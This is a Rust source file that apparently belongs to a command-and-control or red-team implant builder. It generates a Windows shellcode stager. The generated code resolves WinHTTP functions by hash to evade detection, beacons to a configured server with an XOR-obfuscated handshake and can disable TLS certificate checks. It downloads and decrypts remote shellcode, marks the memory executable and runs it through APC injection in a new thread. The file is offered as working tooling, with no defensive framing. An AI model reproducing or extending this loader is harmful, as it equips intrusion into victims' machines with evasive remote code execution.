use super::utils::{djb2_hash, INSTANCE_TEMPLATE_PATH, TARGET_INSTANCE_PATH};
use crate::config::{GenerateArch, PulseConfig, Version};

pub fn generate_winhttp_pulse(
    config: PulseConfig,
    _arch: GenerateArch,
    _version: &Version,
    _source: bool,
    tls: bool,
) -> anyhow::Result<()> {
    let template_path = std::path::Path::new(INSTANCE_TEMPLATE_PATH);
    if !template_path.exists() {
        anyhow::bail!("Instance template not found: {}", INSTANCE_TEMPLATE_PATH);
    }
    let template = std::fs::read_to_string(template_path)?;

    let url = &config.target;
    if url.is_empty() {
        anyhow::bail!("target url is empty.");
    }
    let colon_pos = url
        .find(':')
        .ok_or_else(|| anyhow::anyhow!("invalid target format, expected ip:port"))?;
    let (ip, port_str) = url.split_at(colon_pos);
    let port: u16 = port_str[1..].parse()?;

    let magic = djb2_hash(&config.flags.magic);
    let key = &config.key;
    let iv: String = key.chars().rev().collect();

    let key_bytes = format_byte_literals(key.as_bytes());
    let iv_bytes = format_byte_literals(iv.as_bytes());

    // WinHTTP uses wide strings (LPCWSTR) - pre-generate u16 arrays at codegen time
    let ip_wide = format_wide_literals(ip);
    let ip_wide_len = wide_len(ip);
    let method_wide = format_wide_literals(&config.http.method);
    let method_wide_len = wide_len(&config.http.method);
    let path_wide = format_wide_literals(&config.http.path);
    let path_wide_len = wide_len(&config.http.path);

    // Build headers wide string: "Header1: Value1\r\nHeader2: Value2\r\n"
    let mut headers_str = String::new();
    for (k, v) in &config.http.headers {
        headers_str.push_str(&format!("{}: {}\r\n", k, v));
    }
    let has_headers = !headers_str.is_empty();
    let headers_wide = format_wide_literals(&headers_str);
    let headers_wide_len = wide_len(&headers_str);

    // WinHTTP flags
    let request_flags = if tls {
        "0x00800000u32" // WINHTTP_FLAG_SECURE
    } else {
        "0u32"
    };

    let start_method = format!(
        r#"    pub unsafe fn start(&self, _args: *mut c_void) {{
        fn xor_process(data: &mut [u8], key: &[u8], iv: &[u8], counter: &mut usize) {{
            for byte in data.iter_mut() {{
                *byte ^= key[*counter % key.len()] ^ iv[*counter % iv.len()];
                *counter += 1;
            }}
        }}

        // Load winhttp.dll
        let dll_name: [u8; 12] = [b'w', b'i', b'n', b'h', b't', b't', b'p', b'.', b'd', b'l', b'l', 0];
        let load_lib: FnLoadLibraryA = core::mem::transmute(self.kernel32.LoadLibraryA);
        let h_dll = load_lib(dll_name.as_ptr() as *mut u8);
        if h_dll.is_null() {{ return; }}
        let dll_base = h_dll as usize;

        // Resolve WinHTTP APIs via hash
        let p_winhttp_open: FnWinHttpOpen = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpOpen") as usize));
        let p_winhttp_connect: FnWinHttpConnect = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpConnect") as usize));
        let p_winhttp_open_request: FnWinHttpOpenRequest = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpOpenRequest") as usize));
        let p_winhttp_send_request: FnWinHttpSendRequest = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpSendRequest") as usize));
        let p_winhttp_receive_response: FnWinHttpReceiveResponse = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpReceiveResponse") as usize));
        let p_winhttp_read_data: FnWinHttpReadData = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpReadData") as usize));
        let p_winhttp_close_handle: FnWinHttpCloseHandle = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpCloseHandle") as usize));
        let p_winhttp_set_option: FnWinHttpSetOption = core::mem::transmute(
            resolve::_api(dll_base, hash_str!("WinHttpSetOption") as usize));

        // WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_NO_PROXY=1, null, null, 0)
        let h_session = p_winhttp_open(
            core::ptr::null(),
            1u32,
            core::ptr::null(),
            core::ptr::null(),
            0u32,
        );
        if h_session.is_null() {{ return; }}

        // WinHttpConnect(hSession, server, port, 0)
        let server: [u16; {ip_wide_len}] = [{ip_wide}];
        let h_connect = p_winhttp_connect(
            h_session,
            server.as_ptr(),
            {port}u16,
            0u32,
        );
        if h_connect.is_null() {{
            p_winhttp_close_handle(h_session);
            return;
        }}

        // WinHttpOpenRequest(hConnect, method, path, null, null, null, flags)
        let method: [u16; {method_wide_len}] = [{method_wide}];
        let path: [u16; {path_wide_len}] = [{path_wide}];
        let flags: DWORD = {request_flags};
        let h_request = p_winhttp_open_request(
            h_connect,
            method.as_ptr(),
            path.as_ptr(),
            core::ptr::null(),
            core::ptr::null(),
            core::ptr::null(),
            flags,
        );
        if h_request.is_null() {{
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }}

        {tls_ignore_cert}

        // Configuration
        let key: [u8; {key_len}] = [{key_bytes}];
        let iv: [u8; {iv_len}] = [{iv_bytes}];

        // Build handshake body: [start][magic:4][artifact_id:4][end]
        let mut body: [u8; 10] = [0; 10];
        body[0] = {start}u8;
        let m = {magic}u32.to_le_bytes();
        body[1] = m[0]; body[2] = m[1]; body[3] = m[2]; body[4] = m[3];
        let a = {artifact_id}u32.to_le_bytes();
        body[5] = a[0]; body[6] = a[1]; body[7] = a[2]; body[8] = a[3];
        body[9] = {end}u8;

        // Encrypt body
        let mut counter: usize = 0;
        xor_process(&mut body, &key, &iv, &mut counter);

        // WinHttpSendRequest(hRequest, headers, headersLen, body, bodyLen, totalLen, context)
        {headers_decl}
        let ret = p_winhttp_send_request(
            h_request,
            {headers_ptr},
            {headers_param_len},
            body.as_ptr() as PVOID,
            10u32,
            10u32,
            0usize,
        );
        if ret == 0 {{
            p_winhttp_close_handle(h_request);
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }}

        // WinHttpReceiveResponse
        let ret = p_winhttp_receive_response(h_request, core::ptr::null_mut());
        if ret == 0 {{
            p_winhttp_close_handle(h_request);
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }}

        // Read response body: first 9 bytes header
        let mut resp: [u8; 9] = [0; 9];
        let mut offset = 0u32;
        while offset < 9 {{
            let mut bytes_read: DWORD = 0;
            let ret = p_winhttp_read_data(
                h_request,
                resp.as_mut_ptr().add(offset as usize) as PVOID,
                9 - offset,
                &mut bytes_read,
            );
            if ret == 0 || bytes_read == 0 {{
                p_winhttp_close_handle(h_request);
                p_winhttp_close_handle(h_connect);
                p_winhttp_close_handle(h_session);
                return;
            }}
            offset += bytes_read;
        }}

        // Decrypt and validate response
        counter = 0;
        xor_process(&mut resp, &key, &iv, &mut counter);
        if resp[0] != {start}u8 {{
            p_winhttp_close_handle(h_request);
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }}
        let recv_magic = u32::from_le_bytes([resp[1], resp[2], resp[3], resp[4]]);
        let recv_len = u32::from_le_bytes([resp[5], resp[6], resp[7], resp[8]]);
        if recv_magic != {magic}u32 || recv_len == 0 {{
            p_winhttp_close_handle(h_request);
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }}

        // Allocate memory for shellcode
        let mut base_addr: PVOID = core::ptr::null_mut();
        let mut region_size: SIZE_T = recv_len as usize + 1;
        let nt_alloc: FnNtAllocateVirtualMemory =
            core::mem::transmute(self.ntdll.NtAllocateVirtualMemory);
        let status = nt_alloc(
            -1isize as HANDLE, &mut base_addr, 0, &mut region_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        );
        if status != STATUS_SUCCESS || base_addr.is_null() {{
            p_winhttp_close_handle(h_request);
            p_winhttp_close_handle(h_connect);
            p_winhttp_close_handle(h_session);
            return;
        }}

        // Read shellcode via WinHttpReadData
        let mut total_read: u32 = 0;
        while total_read < recv_len {{
            let mut bytes_read: DWORD = 0;
            let ret = p_winhttp_read_data(
                h_request,
                (base_addr as *mut u8).add(total_read as usize) as PVOID,
                recv_len - total_read,
                &mut bytes_read,
            );
            if ret == 0 || bytes_read == 0 {{
                p_winhttp_close_handle(h_request);
                p_winhttp_close_handle(h_connect);
                p_winhttp_close_handle(h_session);
                return;
            }}
            total_read += bytes_read;
        }}
        p_winhttp_close_handle(h_request);
        p_winhttp_close_handle(h_connect);
        p_winhttp_close_handle(h_session);

        // Decrypt shellcode
        xor_process(
            core::slice::from_raw_parts_mut(base_addr as *mut u8, recv_len as usize),
            &key, &iv, &mut counter,
        );

        // Change memory protection to executable
        let mut old_protect: ULONG = 0;
        let mut protect_base = base_addr;
        let mut protect_size = region_size;
        let nt_protect: FnNtProtectVirtualMemory =
            core::mem::transmute(self.ntdll.NtProtectVirtualMemory);
        nt_protect(
            -1isize as HANDLE, &mut protect_base, &mut protect_size,
            PAGE_EXECUTE_READ, &mut old_protect,
        );

        // Execute shellcode via APC injection
        let nt_create: FnNtCreateThreadEx =
            core::mem::transmute(self.ntdll.NtCreateThreadEx);
        let nt_queue: FnNtQueueApcThread =
            core::mem::transmute(self.ntdll.NtQueueApcThread);
        let nt_resume: FnNtAlertResumeThread =
            core::mem::transmute(self.ntdll.NtAlertResumeThread);
        let nt_wait: FnNtWaitForSingleObject =
            core::mem::transmute(self.ntdll.NtWaitForSingleObject);

        let mut thread_handle: HANDLE = core::ptr::null_mut();
        nt_create(
            &mut thread_handle, 0x1FFFFF, core::ptr::null_mut(),
            -1isize as HANDLE, base_addr, core::ptr::null_mut(),
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
            0, 0, 0, core::ptr::null_mut(),
        );
        if thread_handle.is_null() {{ return; }}

        nt_queue(
            thread_handle, base_addr,
            core::ptr::null_mut(), core::ptr::null_mut(), core::ptr::null_mut(),
        );

        let mut suspend_count: ULONG = 0;
        nt_resume(thread_handle, &mut suspend_count);
        nt_wait(thread_handle, 0, core::ptr::null_mut());
    }}"#,
        ip_wide_len = ip_wide_len,
        ip_wide = ip_wide,
        port = port,
        method_wide_len = method_wide_len,
        method_wide = method_wide,
        path_wide_len = path_wide_len,
        path_wide = path_wide,
        key_len = key.len(),
        key_bytes = key_bytes,
        iv_len = iv.len(),
        iv_bytes = iv_bytes,
        headers_decl = if has_headers {
            format!(
                "let req_headers: [u16; {}] = [{}];",
                headers_wide_len, headers_wide
            )
        } else {
            String::new()
        },
        headers_ptr = if has_headers {
            "req_headers.as_ptr()"
        } else {
            "core::ptr::null()"
        },
        headers_param_len = if has_headers {
            format!("{}u32", headers_str.len()) // character count, not u16 count
        } else {
            "0u32".to_string()
        },
        request_flags = request_flags,
        tls_ignore_cert = if tls {
            r#"// Ignore certificate errors for self-signed certs
        // WINHTTP_OPTION_SECURITY_FLAGS = 31
        // WinHTTP does not support SECURITY_FLAG_IGNORE_REVOCATION (0x80),
        // revocation checking is disabled by default in WinHTTP.
        let mut sec_flags: DWORD = 0x00000100u32 | 0x00000200u32 | 0x00001000u32 | 0x00002000u32;
        p_winhttp_set_option(
            h_request,
            31u32,
            &mut sec_flags as *mut DWORD as PVOID,
            4u32,
        );"#
        } else {
            ""
        },
        start = config.flags.start,
        end = config.flags.end,
        magic = format!("0x{:08x}", magic),
        artifact_id = config.flags.artifact_id,
    );

    let instance_rs = format!("{}\n{}\n}}\n", template, start_method);
    let target_path = std::path::Path::new(TARGET_INSTANCE_PATH);
    std::fs::write(target_path, instance_rs)?;

    Ok(())
}

fn format_byte_literals(bytes: &[u8]) -> String {
    bytes
        .iter()
        .map(|b| format!("0x{:02x}", b))
        .collect::<Vec<_>>()
        .join(", ")
}

/// Format a string as a wide (UTF-16LE) u16 array literal, null-terminated
fn format_wide_literals(s: &str) -> String {
    s.encode_utf16()
        .chain(core::iter::once(0u16))
        .map(|c| format!("0x{:04x}", c))
        .collect::<Vec<_>>()
        .join(", ")
}

/// Get the length of the wide string array (including null terminator)
fn wide_len(s: &str) -> usize {
    s.encode_utf16().count() + 1 // +1 for null terminator
}
